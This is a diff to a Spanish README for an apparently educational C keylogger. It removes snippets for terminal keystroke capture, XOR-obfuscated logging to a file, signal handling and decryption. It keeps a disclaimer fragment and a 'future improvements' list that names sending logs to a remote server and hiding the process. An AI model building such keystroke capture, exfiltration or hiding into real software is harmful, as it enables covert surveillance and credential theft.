@@ -65,19 +65,6 @@ clang decrypt.c -o decrypt
 
 🔹 1️⃣ Captura de teclas (get_key())
 
-```
-char get_key() {
-    struct termios oldt, newt;
-    char ch;
-    tcgetattr(STDIN_FILENO, &oldt);
-    newt = oldt;
-    newt.c_lflag &= ~(ICANON | ECHO);
-    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
-    ch = getchar();
-    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
-    return ch;
-} ```
-
 📌 Lógica:
 
 1. Modifica la terminal para desactivar el buffer de línea y eco de caracteres.
@@ -94,11 +81,6 @@ char get_key() {
 ---
 
 🔹 2️⃣ Escritura segura en el archivo (log.txt)
-
-if (isprint(key)) {
-    fputc(key ^ XOR_KEY, file);
-    fflush(file);
-}
 
 📌 Lógica:
 
@@ -117,12 +99,6 @@ if (isprint(key)) {
 
 🔹 3️⃣ Manejo de señales (CTRL+C)
 
-void handle_exit(int sig) {
-    if (file) fclose(file);
-    printf("\n[+] Keylogger detenido. Datos guardados en %s\n", LOG_FILE);
-    exit(0);
-}
-
 📌 Lógica:
 
 1. Intercepta CTRL+C para evitar que se cierre inesperadamente.
@@ -136,11 +112,6 @@ void handle_exit(int sig) {
 ---
 
 🔹 4️⃣ Descifrado de datos (decrypt.c)
-
-int ch;
-while ((ch = fgetc(file)) != EOF) {
-    putchar(ch ^ XOR_KEY); // XOR inverso
-}
 
 📌 Lógica:
 
@@ -199,33 +170,11 @@ El uso de este software en sistemas sin permiso es ilegal y puede tener consecue
 
 ---
 
-📢 Contribuciones
-
-Si tienes ideas para mejorar este proyecto, ¡haz un pull request o abre un issue en GitHub!
-
-🚀 Contacto: [Tu email o GitHub]
-
-
----
-
 🎯 Mejoras Futuras
 
 🔹 Enviar logs cifrados a un servidor remoto.
 🔹 Mejor manejo de procesos y ocultación.
 🔹 Soporte para capturar teclas especiales (Shift, Enter).
 
-
----
-
-📌 Conclusión
-
-Este proyecto muestra cómo funciona un keylogger en C, su aplicación en seguridad ofensiva y defensiva, y la importancia de proteger sistemas contra este tipo de ataques.
-
-Si quieres aprender más sobre seguridad en Linux y programación en C, este es un excelente punto de partida. 🚀
-
-
----
-
-📢 ¿Quieres agregar algo más al README?
 
  
